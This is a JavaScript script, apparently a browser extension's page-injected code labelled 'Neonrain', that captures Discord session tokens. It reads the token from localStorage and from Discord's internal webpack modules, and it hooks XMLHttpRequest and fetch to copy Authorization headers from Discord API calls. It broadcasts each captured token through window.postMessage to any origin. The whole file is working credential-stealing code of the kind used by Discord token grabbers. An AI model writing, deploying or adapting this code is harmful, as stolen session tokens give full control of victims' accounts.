// This script runs in the page context to intercept Discord API requests
(function() {
  'use strict';

  let capturedToken = null;

  // Try to extract token from Discord's internal state immediately
  function tryExtractToken() {
    try {
      // Method 1: Try to get from localStorage (check if it exists first)
      if (typeof localStorage !== 'undefined') {
        const localStorageToken = localStorage.getItem('token');
        if (localStorageToken && localStorageToken.startsWith('"') && localStorageToken.endsWith('"')) {
          const token = localStorageToken.slice(1, -1);
          if (token && token.length > 20) {
            console.log('[Neonrain] Token found in localStorage');
            capturedToken = token;
            window.postMessage({
              type: 'DISCORD_TOKEN_CAPTURED',
              token: token
            }, '*');
            return true;
          }
        }
      } else {
        console.log('[Neonrain] localStorage not available yet');
      }

      // Method 2: Try to extract from webpack modules
      if (typeof window.webpackChunkdiscord_app !== 'undefined') {
        window.webpackChunkdiscord_app.push([[Symbol()], {}, (e) => {
          for (const mod of Object.values(e.c)) {
            if (mod?.exports?.default?.getToken) {
              const token = mod.exports.default.getToken();
              if (token && token.length > 20) {
                console.log('[Neonrain] Token found via webpack module');
                capturedToken = token;
                window.postMessage({
                  type: 'DISCORD_TOKEN_CAPTURED',
                  token: token
                }, '*');
                return true;
              }
            }
          }
        }]);
      } else {
        console.log('[Neonrain] webpack modules not available yet');
      }

      console.log('[Neonrain] Could not extract token directly, will wait for API calls');
      return false;
    } catch (err) {
      console.error('[Neonrain] Error extracting token:', err);
      return false;
    }
  }

  // Try to extract token after page loads
  setTimeout(() => {
    console.log('[Neonrain] Attempting to extract token from Discord...');
    tryExtractToken();
  }, 2000);

  // Listen for manual extraction trigger
  window.addEventListener('message', (event) => {
    if (event.source !== window) return;
    if (event.data.type === 'EXTRACT_TOKEN_NOW') {
      console.log('[Neonrain] Manual token extraction triggered');
      tryExtractToken();
    }
  });

  // Override XMLHttpRequest
  const originalXHROpen = XMLHttpRequest.prototype.open;
  const originalXHRSend = XMLHttpRequest.prototype.send;

  XMLHttpRequest.prototype.open = function(method, url, ...args) {
    this._url = url;
    return originalXHROpen.apply(this, [method, url, ...args]);
  };

  XMLHttpRequest.prototype.send = function(...args) {
    // Capture Authorization header from Discord API requests
    const originalSetRequestHeader = this.setRequestHeader;
    this.setRequestHeader = function(header, value) {
      if (header.toLowerCase() === 'authorization' &&
          this._url &&
          this._url.includes('discord.com/api')) {
        capturedToken = value;
        window.postMessage({
          type: 'DISCORD_TOKEN_CAPTURED',
          token: value
        }, '*');
      }
      return originalSetRequestHeader.apply(this, arguments);
    };
    return originalXHRSend.apply(this, args);
  };

  // Override fetch
  const originalFetch = window.fetch;
  window.fetch = function(url, options = {}) {
    if (typeof url === 'string' && url.includes('discord.com/api')) {
      const headers = options.headers || {};
      const authorization = headers['authorization'] || headers['Authorization'];

      if (authorization && authorization !== capturedToken) {
        capturedToken = authorization;
        window.postMessage({
          type: 'DISCORD_TOKEN_CAPTURED',
          token: authorization
        }, '*');
      }
    }
    return originalFetch.apply(this, arguments);
  };

  console.log('[Neonrain] Discord token capture injected');
})();
